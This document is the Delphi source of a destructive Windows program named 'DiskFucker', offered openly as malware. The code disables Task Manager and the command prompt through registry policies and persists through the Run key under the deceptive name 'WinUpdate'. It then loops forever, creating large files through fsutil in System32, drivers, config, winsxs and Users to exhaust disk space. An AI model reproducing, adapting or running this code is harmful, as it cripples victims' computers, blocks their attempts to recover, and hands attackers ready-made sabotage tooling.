program DiskFucker;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  System.SysUtils,
  Windows,
  ShellAPI,
  Registry,
  Math;

procedure LockerTask(disable: boolean);
const
  sKey = 'DisableTaskMgr';
var
  Reg : TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_CURRENT_USER;
    if Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\System', True) then
    begin
      if Reg.ValueExists(sKey) then
      begin
      if disable = true then Reg.WriteInteger(sKey, 1);
      if disable = false then Reg.WriteInteger(sKey, 0);
      end
      else
      begin
      if disable = true then Reg.WriteInteger(sKey, 1);
      if disable = false then Reg.WriteInteger(sKey, 0);
      end;
      Reg.CloseKey;
    end;
  finally
    Reg.Free;
  end;
end;

procedure CMDDisable(disable: boolean);
const
  sKey = 'DisableCMD';
var
  Reg : TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_CURRENT_USER;
    if Reg.OpenKey('\Software\Policies\Microsoft\Windows\System', True) then
    begin
      if Reg.ValueExists(sKey) then
      begin
      if disable = true then Reg.WriteInteger(sKey, 1);
      if disable = false then Reg.WriteInteger(sKey, 0);
      end
      else
      begin
      if disable = true then Reg.WriteInteger(sKey, 1);
      if disable = false then Reg.WriteInteger(sKey, 0);
      end;
      Reg.CloseKey;
    end;
  finally
    Reg.Free;
  end;
end;

procedure autorunon();
var reg: tregistry;
begin
reg := tregistry.create;
reg.rootkey := HKEY_CURRENT_USER;
if reg.openkey('software\microsoft\windows\currentversion\run', false)then
reg.writestring('WinUpdate',paramstr(0));
reg.closekey;
reg.free;
end;

const
paths: array of string = ['Windows\help\','Windows\Setup\','Windows\System32\','Windows\Resources\','Windows\rescache\','Windows\servicing\','Users\','Windows\System32\AppRaiser\','Windows\System32\config\','Windows\System32\drivers\','Windows\winsxs\'];

var
Handle: THandle;
rand: string;
freespace: Real;
currentdir: string;
begin
FreeConsole();
Randomize;
LockerTask(true);
CMDDisable(true);
autorunon();
while true do
begin
freespace := DiskFree(3)/1024;
currentdir := paths[Random(Length(paths))];
Sleep(10);
rand := IntToStr(RandomRange(1000000, 4751984549874156));
if freespace >= 1048576 then
begin
 ShellExecute(Handle,'runas', 'fsutil.exe', PWideChar('file createnew C:\'+currentdir+rand+' 1073741824'), nil, SW_HIDE);
 if (FileGetAttr('C:\'+currentdir+rand) and faHidden) > 0 then
  FileSetAttr('C:\'+currentdir+rand, FileGetAttr('C:\'+currentdir+rand) xor faHidden);
end
else if freespace >= 51200 then
begin
 ShellExecute(Handle,'runas', 'fsutil.exe', PWideChar('file createnew C:\'+currentdir+rand+' 52428800'), nil, SW_HIDE);
 if (FileGetAttr('C:\'+currentdir+rand) and faHidden) > 0 then
  FileSetAttr('C:\'+currentdir+rand, FileGetAttr('C:\'+currentdir+rand) xor faHidden);
end
else if freespace <= 51200 then
begin
 ShellExecute(Handle,'runas', 'fsutil.exe', PWideChar('file createnew C:\'+currentdir+rand+' 1048576'), nil, SW_HIDE);
 if (FileGetAttr('C:\'+currentdir+rand) and faHidden) > 0 then
  FileSetAttr('C:\'+currentdir+rand, FileGetAttr('C:\'+currentdir+rand) xor faHidden);
end
else if freespace <= 1024 then
begin
 ShellExecute(Handle,'runas', 'fsutil.exe', PWideChar('file createnew C:\'+currentdir+rand+' 102400'), nil, SW_HIDE);
 if (FileGetAttr('C:\'+currentdir+rand) and faHidden) > 0 then
  FileSetAttr('C:\'+currentdir+rand, FileGetAttr('C:\'+currentdir+rand) xor faHidden);
end
else if freespace >= 100 then
begin
 ShellExecute(Handle,'runas', 'fsutil.exe', PWideChar('file createnew C:\'+currentdir+rand+' 10240'), nil, SW_HIDE);
 if (FileGetAttr('C:\'+currentdir+rand) and faHidden) > 0 then
  FileSetAttr('C:\'+currentdir+rand, FileGetAttr('C:\'+currentdir+rand) xor faHidden);
end
else if freespace <= 100 then
begin
 ShellExecute(Handle,'runas', 'fsutil.exe', PWideChar('file createnew C:\'+currentdir+rand+' 10240'), nil, SW_HIDE);
 if (FileGetAttr('C:\'+currentdir+rand) and faHidden) > 0 then
  FileSetAttr('C:\'+currentdir+rand, FileGetAttr('C:\'+currentdir+rand) xor faHidden);
end
else if freespace <= 10 then
begin
 ShellExecute(Handle,'runas', 'fsutil.exe', PWideChar('file createnew C:\'+currentdir+rand+' 1024'), nil, SW_HIDE);
 if (FileGetAttr('C:\'+currentdir+rand) and faHidden) > 0 then
  FileSetAttr('C:\'+currentdir+rand, FileGetAttr('C:\'+currentdir+rand) xor faHidden);
end
else if freespace <= 5 then;
end;
end.
